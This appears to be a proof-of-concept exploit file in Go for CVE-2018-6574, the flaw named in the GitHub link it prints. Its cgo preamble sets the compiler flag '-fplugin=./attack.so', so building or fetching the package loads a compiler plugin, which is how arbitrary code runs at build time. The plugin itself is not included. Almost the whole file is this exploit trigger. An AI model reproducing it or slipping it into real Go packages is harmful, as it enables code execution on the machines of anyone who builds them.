package main

/*
#cgo linux CFLAGS: -fplugin=./attack.so

void echo() {
  printf("link: https://github.com/sirius-bl4ck/cve2018-6574");
}

*/
import "C"

func main() {
	C.echo()
	return
}
